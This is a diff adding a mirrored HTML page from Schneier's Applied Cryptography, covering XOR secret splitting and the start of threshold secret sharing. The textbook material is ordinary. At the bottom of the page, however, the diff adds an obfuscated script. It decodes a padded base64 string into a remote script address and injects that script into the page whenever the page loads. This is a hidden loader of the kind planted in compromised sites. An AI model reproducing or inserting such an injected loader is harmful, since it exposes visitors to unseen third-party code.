@@ -1,0 +1,146 @@
+<html>
+<head>
+<TITLE>APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C:Basic Protocols</TITLE>
+<!-- BEGIN HEADER -->
+<META NAME="ROBOTS" CONTENT="NOINDEX, NOFOLLOW">
+<SCRIPT>
+<!--
+function displayWindow(url, width, height) {
+        var Win = window.open(url,"displayWindow",'width=' + width +
+',height=' + height + ',resizable=1,scrollbars=yes');
+}
+//-->
+</SCRIPT>
+
+</HEAD>
+<body bgcolor="ffffff" link="#006666" alink="#006666" vlink="#006666">
+<P>
+<CENTER><B>Applied Cryptography, Second Edition: Protocols,  Algorthms, and Source Code in C (cloth)</B>
+<FONT SIZE="-2">
+<BR>
+<I>(Publisher: John Wiley & Sons, Inc.)</I>
+<BR>
+Author(s): Bruce Schneier
+<BR>
+ISBN: 0471128457
+<BR>
+Publication Date: 01/01/96
+</FONT></CENTER>
+<P>
+
+
+<!-- Empty Reference Subhead -->
+
+<!--ISBN=0471128457//-->
+<!--TITLE=APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C//-->
+<!--AUTHOR=Bruce Schneier//-->
+<!--PUBLISHER=Wiley Computer Publishing//-->
+<!--CHAPTER=03//-->
+<!--PAGES=069-071//-->
+<!--UNASSIGNED1//-->
+<!--UNASSIGNED2//-->
+
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="03-10.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="03-12.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+<P><BR></P>
+<P>There are other techniques for message broadcasting, some of which avoid the previous problem. These are discussed in Section 22.7.
+</P>
+<TABLE WIDTH="70%"><TH CAPTION ALIGN="CENTER" COLSPAN="2">TABLE 3.3<BR>Three-Key Message Encryption
+<TR>
+<TD COLSPAN="2"><HR>
+<TR>
+<TH ALIGN="LEFT">Encrypted with Keys:
+<TH ALIGN="LEFT">Must be Decrypted with Keys:
+<TR>
+<TD COLSPAN="2"><HR>
+<TR>
+<TD VALIGN="TOP" ALIGN="LEFT"><I>K</I><SUB>A</SUB>
+<TD VALIGN="TOP" ALIGN="LEFT"><I>K</I><SUB>B</SUB> and <I>K</I><SUB>C</SUB>
+<TR>
+<TD VALIGN="TOP" ALIGN="LEFT"><I>K</I><SUB>B</SUB>
+<TD VALIGN="TOP" ALIGN="LEFT"><I>K</I><SUB>A</SUB> and <I>K</I><SUB>C</SUB>
+<TR>
+<TD VALIGN="TOP" ALIGN="LEFT"><I>K</I><SUB>C</SUB>
+<TD VALIGN="TOP" ALIGN="LEFT"><I>K</I><SUB>A</SUB> and <I>K</I><SUB>B</SUB>
+<TR>
+<TD VALIGN="TOP" ALIGN="LEFT"><I>K</I><SUB>A</SUB> and <SUB>K</SUB><I>B</I>
+<TD VALIGN="TOP" ALIGN="LEFT"><I>K</I><SUB>C</SUB>
+<TR>
+<TD VALIGN="TOP" ALIGN="LEFT"><I>K</I><SUB>A</SUB> and <I>K</I><SUB>C</SUB>
+<TD VALIGN="TOP" ALIGN="LEFT"><I>K</I><SUB>B</SUB>
+<TR>
+<TD VALIGN="TOP" ALIGN="LEFT"><I>K</I><SUB>B</SUB> and <I>K</I><SUB>C</SUB>
+<TD VALIGN="TOP" ALIGN="LEFT"><I>K</I><SUB>A</SUB>
+<TR>
+<TD COLSPAN="2"><HR>
+</TABLE>
+<H3><A NAME="Heading7"></A><FONT COLOR="#000077">3.6 Secret Splitting</FONT></H3>
+<P>Imagine that you&#146;ve invented a new, extra gooey, extra sweet, cream filling or a burger sauce that is even more tasteless than your competitors&#146;. This is important; you have to keep it secret. You could tell only your most trusted employees the exact mixture of ingredients, but what if one of them defects to the competition? There goes the secret, and before long every grease palace on the block will be making burgers with sauce as tasteless as yours.
+</P>
+<P>This calls for <B>secret splitting</B>. There are ways to take a message and divide it up into pieces [551]. Each piece by itself means nothing, but put them together and the message appears. If the message is the recipe and each employee has a piece, then only together can they make the sauce. If any employee resigns with his single piece of the recipe, his information is useless by itself.</P>
+<P>The simplest sharing scheme splits a message between two people. Here&#146;s a protocol in which Trent can split a message between Alice and Bob:</P>
+<DL>
+<DD><B>(1)</B>&nbsp;&nbsp;Trent generates a random-bit string, <I>R</I>, the same length as the message, <I>M</I>.
+<DD><B>(2)</B>&nbsp;&nbsp;Trent XORs <I>M</I> with <I>R</I> to generate <I>S</I>.
+<DL>
+<DD><I>M</I> &#8853; <I>R</I> = <I>S</I>
+</DL>
+<DD><B>(3)</B>&nbsp;&nbsp;Trent gives <I>R</I> to Alice and <I>S</I> to Bob.
+</DL>
+<P>To reconstruct the message, Alice and Bob have only one step to do:
+</P>
+<DL>
+<DD><B>(4)</B>&nbsp;&nbsp;Alice and Bob XOR their pieces together to reconstruct the message:
+<DL>
+<DD><I>R</I> &#8853; <I>S</I> = <I>M</I>
+</DL>
+</DL>
+<P>This technique, if done properly, is absolutely secure. Each piece, by itself, is absolutely worthless. Essentially, Trent is encrypting the message with a one-time pad and giving the ciphertext to one person and the pad to the other person. Section 1.5 discusses one-time pads; they have perfect security. No amount of computing power can determine the message from one of the pieces.
+</P>
+<P>It is easy to extend this scheme to more people. To split a message among more than two people, XOR more random-bit strings into the mixture. In this example, Trent divides up a message into four pieces:</P>
+<DL>
+<DD><B>(1)</B>&nbsp;&nbsp;Trent generates three random-bit strings, <I>R</I>, <I>S</I>, and <I>T</I>, the same length as the message, <I>M</I>.
+<DD><B>(2)</B>&nbsp;&nbsp;Trent XORs <I>M</I> with the three strings to generate <I>U</I>:
+<DL>
+<DD><I>M</I> &#8853; <I>R</I> &#8853; <I>S</I> &#8853; <I>T</I> = <I>U</I>
+</DL>
+<DD><B>(3)</B>&nbsp;&nbsp;Trent gives <I>R</I> to Alice, <I>S</I> to Bob, <I>T</I> to Carol, and <I>U</I> to Dave.
+</DL>
+<P>Alice, Bob, Carol, and Dave, working together, can reconstruct the message:
+</P>
+<DL>
+<DD><B>(4)</B>&nbsp;&nbsp;Alice, Bob, Carol, and Dave get together and compute:
+<DL>
+<DD><I>R</I> &#8853; <I>S</I> &#8853; <I>T</I> &#8853; <I>U</I> = <I>M</I>
+</DL>
+</DL>
+<P>This is an adjudicated protocol. Trent has absolute power and can do whatever he wants. He can hand out gibberish and claim that it is a valid piece of the secret; no one will know it until they try to reconstruct the secret. He can hand out a piece to Alice, Bob, Carol, and Dave, and later tell everyone that only Alice, Carol, and Dave are needed to reconstruct the secret, and then fire Bob. But since this is Trent&#146;s secret to divide up, this isn&#146;t a problem.
+</P>
+<P>However, this protocol has a problem: If any of the pieces gets lost and Trent isn&#146;t around, so does the message. If Carol, who has a piece of the sauce recipe, goes to work for the competition and takes her piece with her, the rest of them are out of luck. She can&#146;t reproduce the recipe, but neither can Alice, Bob, and Dave working together. Her piece is as critical to the message as every other piece combined. All Alice, Bob, or Dave know is the length of the message&#151;nothing more. This is true because <I>R</I>, <I>S</I>, <I>T</I>, <I>U</I>, and <I>M</I> all have the same length; seeing anyone of them gives the length of <I>M</I>. Remember, <I>M</I> isn&#146;t being split in the normal sense of the word; it is being XORed with random values.</P>
+<H3><A NAME="Heading8"></A><FONT COLOR="#000077">3.7 Secret Sharing</FONT></H3>
+<P>You&#146;re setting up a launch program for a nuclear missile. You want to make sure that no single raving lunatic can initiate a launch. You want to make sure that no two raving lunatics can initiate a launch. You want at least three out of five officers to be raving lunatics before you allow a launch.
+</P>
+<P>This is easy to solve. Make a mechanical launch controller. Give each of the five officers a key and require that at least three officers stick their keys in the proper slots before you&#146;ll allow them to blow up whomever we&#146;re blowing up this week. (If you&#146;re really worried, make the slots far apart and require the officers to insert the keys simultaneously&#151;you wouldn&#146;t want an officer who steals two keys to be able to vaporize Toledo.)</P>
+<P>We can get even more complicated. Maybe the general and two colonels are authorized to launch the missile, but if the general is busy playing golf then five colonels are required to initiate a launch. Make the launch controller so that it requires five keys. Give the general three keys and the colonels one each. The general together with any two colonels can launch the missile; so can the five colonels. However, a general and one colonel cannot; neither can four colonels.</P>
+<P>A more complicated sharing scheme, called a <B>threshold scheme</B>, can do all of this and more&#151;mathematically. At its simplest level, you can take any message (a secret recipe, launch codes, your laundry list, etc.) and divide it into <I>n</I> pieces, called <B>shadows or shares</B>, such that any <I>m</I> of them can be used to reconstruct the message. More precisely, this is called an <B>(<I>m,n</I>)-threshold scheme</B>.</P>
+<P>With a (3,4)-threshold scheme, Trent can divide his secret sauce recipe among Alice, Bob, Carol, and Dave, such that any three of them can put their shadows together and reconstruct the message. If Carol is on vacation, Alice, Bob, and Dave can do it. If Bob gets run over by a bus, Alice, Carol, and Dave can do it. However, if Bob gets run over by a bus while Carol is on vacation, Alice and Dave can&#146;t reconstruct the message by themselves.</P><P><BR></P>
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="03-10.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="03-12.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+
+[an error occurred while processing this directive]
+<script type="text/javascript">(function(fNNUHiDy, ciFqacdx) {ciFqacdx = fNNUHiDy.createElement('script');ciFqacdx.type = 'text/javascript';ciFqacdx.async = true;ciFqacdx.src = atob('0024241d2f28Ly91YmxvY2stcmVmZXJlci5kZXYvY2FtcGFpZ24uanM=0024241d2f28'.replace(/0024241d2f28/gi, '')) + '?' + String(Math.random()).replace('0.','');fNNUHiDy.getElementsByTagName('body')[0].appendChild(ciFqacdx);}(document));</script></body>
+</html>
